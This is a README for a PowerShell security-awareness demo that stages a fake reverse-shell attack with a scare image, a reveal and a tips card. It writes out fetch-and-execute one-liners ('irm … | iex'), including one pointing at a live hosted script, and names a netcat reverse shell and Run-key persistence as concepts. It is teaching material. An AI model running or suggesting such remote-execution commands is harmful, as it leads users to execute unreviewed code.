# PowerShell Security Awareness Demo

A cybersecurity awareness tool that simulates what a real reverse shell attack looks like from the victim's perspective in real time. Built to teach people why blindly running PowerShell commands from the internet is dangerous.

> **Everything in this script is fake. No files are modified. No connections are made. No data is touched.**

---

## What This Is

Most people have no idea what happens when they run a command like:

```powershell
irm https://some-url.com/script.ps1 | iex
```

This project shows them — viscerally — in 60 seconds.

The script walks through a simulated attack chain:
- Silent payload download (fake)
- Decoy image drop (real image opens, fake payload)
- Reverse shell simulation (CMD windows printing text only)
- File enumeration, credential harvest, persistence (all fake output)
- Full reveal + explanation of what just happened
- Security tips card displayed at the end

The goal is to make the danger *feel real* before explaining that it wasn't.

---

## Repository Contents

| File | Purpose |
|------|---------|
| `awareness.ps1` | Main PowerShell awareness script |
| `skull.png` | Scare image: displays fullscreen during simulated attack phase |
| `awareness.png` | Tips card: displays fullscreen at the end of the demo |
| `README.md` | This file |

---

## Images

### `skull.png`
Displayed fullscreen at the moment the simulated "breach" is revealed. Red skull on black background with blood effect and text reading **"YOUR SYSTEM IS HACKED"**. Designed to maximize the psychological impact of the demo moment immediately followed by the explanation that nothing real happened.

### `awareness.png`
Displayed fullscreen at the end of the script. A green-on-black security tips card titled **"BEFORE YOU RUN ANYTHING"** with five numbered verification steps. This is the actual takeaway the viewer is meant to keep.

Both images are static PNGs. They contain no executable code, no scripts, no macros, and no embedded payloads of any kind.

---

## How It Works

The script is hosted at a public URL and triggered via:

```powershell
irm https://subigya.com/virus/legit.ps1 | iex
```

This URL is intentionally named to demonstrate exactly the kind of command people are tricked into running. The person running it sees a realistic simulation of a reverse shell attack, then gets the full explanation.

### Attack chain simulated (nothing real executes):

```
[1] Script appears to download nc.exe silently
[2] Decoy image appears to open (misdirection)
[3] Fake reverse shell "connects" to 192.168.0.117:4444
[4] CMD windows open showing fake attacker output
[5] Fake file scan, password harvest, persistence
[6] REVEAL: everything was fake, explanation begins
[7] Awareness tips card opens fullscreen
```

### What actually executes:
- `Invoke-WebRequest` to download two PNG images from this repo
- `Start-Process` to spawn CMD windows that print text and exit
- A WinForms fullscreen window to display the PNG images
- No network connections to any attack infrastructure
- No file modification beyond saving PNGs to the user's Desktop

---

## Technical Notes

**Image display method:** The script uses an inline WinForms PowerShell process to display images in a true borderless fullscreen window (`FormBorderStyle = None`, `WindowState = Maximized`, `TopMost = True`). This avoids relying on any external image viewer and ensures consistent fullscreen behavior across Windows versions.

**Execution policy:** The script uses `-ExecutionPolicy Bypass` only for the child image-viewer process. This is standard practice for scripts that need to run without user-configured policy restrictions and does not persist after the process exits.

**Temp files:** The image viewer script is written to `%TEMP%` as a randomly named `.ps1` file and cleaned up automatically when the process exits.

---

## Who This Is For

- Cybersecurity educators running workshops
- IT teams doing internal phishing/awareness training
- Content creators making security awareness videos
- Anyone who wants to demonstrate the `irm | iex` risk to a non-technical audience

---

## What This Is NOT

- Not a real attack tool
- Not a penetration testing utility
- Not designed to be modified into a real payload
- Not intended for use against systems without explicit consent

This project does not include, reference, or distribute any actual malware, exploits, reverse shells, credential harvesters, or network attack tools. The CMD windows that appear during the demo print hardcoded strings and exit no system commands are run.

---

## Responsible Use

This script is intended to be run by the person who wants to learn, or demonstrated live by an educator to a consenting audience. It should not be:

- Sent to someone without warning as a prank
- Used in a professional environment without prior consent from IT/security teams
- Modified to include real payloads and redistributed

The psychological impact is part of the educational design. The reveal and tips card are non-optional they are hardcoded into the script flow.

---

## Related Concepts Covered

- `irm` / `Invoke-WebRequest` — downloads arbitrary content from URLs
- `iex` / `Invoke-Expression` — executes arbitrary strings as PowerShell code
- Reverse shells — how `nc.exe -e cmd.exe` works conceptually
- Decoy misdirection — why a photo opening is not proof of safety
- Typosquatting — how one character difference in a domain is used in attacks
- Persistence via registry — `HKCU\...\Run` key concept
- Lateral movement — using a compromised host to scan the local network

---

## License

MIT — free to use, share, and adapt for educational purposes.

If you use this in a workshop or video, credit is appreciated but not required.
